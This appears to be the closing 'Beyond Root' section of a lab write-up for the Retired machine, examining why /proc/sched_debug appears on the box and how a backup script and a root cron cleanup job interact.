```

## Beyond Root

### sched\_debug

I spent a bit of time trying to figure out why the `/proc/sched_debug` file is present on Retired and not on my local Ubuntu Mate VM or Ubuntu host. I am not exactly sure that I figured it out, but would love feedback if you know.

This [StackOverflow](https://stackoverflow.com/questions/9953973/how-to-collect-information-of-every-single-cpu) post is what first alerted me to the `/proc/sched_debug` file, but when it wasn’t on any of my local systems, I went a different direction. Still, it is on Retired.

There’s not a ton of documentation about this file, but it seems to be generated based on the kernel being compiled with `CONFIG_SCHED_DEBUG=y` option (according to [kernel.org](https://www.kernel.org/doc/html/latest/scheduler/sched-debug.html)).

The kernel typically installs a `/boot/config-$version` file, and the one on Retired does have the option:

```

dev@retired:/$ uname -a
Linux retired 5.10.0-11-amd64 #1 SMP Debian 5.10.92-2 (2022-02-28) x86_64 GNU/Linux
dev@retired:/$ cat /boot/config-5.10.0-11-amd64  | grep CONFIG_SCHED_DEBUG
CONFIG_SCHED_DEBUG=y
dev@retired:/$ ls -l /proc/sched_debug
-r--r--r-- 1 root root 0 Jul  1 21:25 /proc/sched_debug

```

But, strangely, my VM also has it set:

```

oxdf@hacky$ uname -a
Linux hacky 5.15.0-41-generic #44~20.04.1-Ubuntu SMP Fri Jun 24 13:27:29 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
oxdf@hacky$ cat /boot/config-5.15.0-41-generic | grep CONFIG_SCHED_DEBUG
CONFIG_SCHED_DEBUG=y
oxdf@hacky$ ls -l /proc/sched_debug
ls: cannot access '/proc/sched_debug': No such file or directory

```

I can’t really explain this, but if you can, hit me up on Twitter or Discord.

### webbackup

#### Diving into the Script

The `webbackup` script has this loop at the end that seems to imply that it would keep up to 11 backups. And yet, I never see more than three or four backups:

```

dev@retired:/var/www$ ls
2022-08-01_20-39-00-html.zip  2022-08-01_20-40-00-html.zip  2022-08-01_20-41-00-html.zip  2022-08-01_20-41-16-html.zip  html  license.sqlite

```

I spent too much time trying to understand what I wasn’t seeing in the script. One useful trick was to add an `echo "$backup:$KEEP"` to the loop just before it decrements `$KEEP` to watch it work, and to add `-q` to `zip` to keep a ton of garbage from printing.

```

#!/bin/bash
set -euf -o pipefail

cd /var/www/

SRC=/var/www/html
DST="/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip"

/usr/bin/rm --force -- "$DST"
/usr/bin/zip -q --recurse-paths "$DST" "$SRC"

KEEP=10
/usr/bin/find /var/www/ -maxdepth 1 -name '*.zip' -print0 \
    | sort --zero-terminated --numeric-sort --reverse \
    | while IFS= read -r -d '' backup; do
        if [ "$KEEP" -le 0 ]; then
            /usr/bin/rm --force -- "$backup"
        fi
        echo "$backup:$KEEP"
        KEEP="$((KEEP-1))"
    done

```

l’ll run it without waiting for the cron, and I am able to make more:

```

root@retired:/var/www# webbackup       
/var/www/2022-08-01_20-47-43-html.zip:10
/var/www/2022-08-01_20-47-00-html.zip:9
/var/www/2022-08-01_20-46-00-html.zip:8      
/var/www/2022-08-01_20-45-00-html.zip:7 
root@retired:/var/www# webbackup        
/var/www/2022-08-01_20-47-44-html.zip:10
/var/www/2022-08-01_20-47-43-html.zip:9
/var/www/2022-08-01_20-47-00-html.zip:8
/var/www/2022-08-01_20-46-00-html.zip:7
/var/www/2022-08-01_20-45-00-html.zip:6
root@retired:/var/www# webbackup
/var/www/2022-08-01_20-47-45-html.zip:10 
/var/www/2022-08-01_20-47-44-html.zip:9
/var/www/2022-08-01_20-47-43-html.zip:8     
/var/www/2022-08-01_20-47-00-html.zip:7
/var/www/2022-08-01_20-46-00-html.zip:6
/var/www/2022-08-01_20-45-00-html.zip:5

```

I can get to 11 as well:

```

root@retired:/var/www# webbackup 
/var/www/2022-08-01_20-47-53-html.zip:10
/var/www/2022-08-01_20-47-52-html.zip:9
/var/www/2022-08-01_20-47-51-html.zip:8
/var/www/2022-08-01_20-47-50-html.zip:7
/var/www/2022-08-01_20-47-49-html.zip:6
/var/www/2022-08-01_20-47-48-html.zip:5
/var/www/2022-08-01_20-47-47-html.zip:4
/var/www/2022-08-01_20-47-46-html.zip:3
/var/www/2022-08-01_20-47-45-html.zip:2
/var/www/2022-08-01_20-47-44-html.zip:1
/var/www/2022-08-01_20-47-43-html.zip:0

```

But not more (`2022-08-01_20-47-43-html.zip` was deleted):

```

root@retired:/var/www# webbackup 
/var/www/2022-08-01_20-47-54-html.zip:10
/var/www/2022-08-01_20-47-53-html.zip:9
/var/www/2022-08-01_20-47-52-html.zip:8
/var/www/2022-08-01_20-47-51-html.zip:7
/var/www/2022-08-01_20-47-50-html.zip:6
/var/www/2022-08-01_20-47-49-html.zip:5
/var/www/2022-08-01_20-47-48-html.zip:4
/var/www/2022-08-01_20-47-47-html.zip:3
/var/www/2022-08-01_20-47-46-html.zip:2
/var/www/2022-08-01_20-47-45-html.zip:1
/var/www/2022-08-01_20-47-44-html.zip:0

```

A few minutes later, it was back to three:

```

root@retired:/var/www# ls
2022-08-01_20-48-00-html.zip  2022-08-01_20-49-00-html.zip  2022-08-01_20-50-00-html.zip  html  license.sqlite

```

#### Cron

Turns out there’s a cleanup script running as root on a cron:

```

root@retired:/var/www# crontab -l
...[snip]...
# m h  dom mon dow   command
* * * * * sleep 15; /root/cleanup.sh

```

It waits til 15 seconds after the minute, and runs `/root/cleanup.sh`:

```

#!/bin/bash
/usr/bin/find /var/www/html/ -type l -exec rm -r {} \;
/usr/bin/find /var/www/ -mmin +3 -type f -name "20*" -exec rm {} \;

```

This script uses two `find` commands to cleanup. First, it finds any link files (`-type l`), and uses the `-exec` option to remove them.

The second command finds all files (`-type f`) older than three minutes (`-mmin +3`) and removes them using `-exec` as well.

This explains why I see four files when the script first runs, then three 15 seconds later when the cleanup runs.